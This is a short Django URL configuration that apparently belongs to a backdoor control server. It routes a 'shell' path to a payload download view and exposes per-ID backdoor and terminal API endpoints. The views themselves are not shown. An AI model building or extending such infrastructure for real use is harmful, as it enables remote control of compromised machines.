from django.urls import path
from .views import download_payload, backdoor_api, terminal_api


urlpatterns = [
    path('shell', download_payload),
    path('backdoor_api/<slug:uuid>', backdoor_api),
    path('terminal_api/<slug:uuid>', terminal_api)
]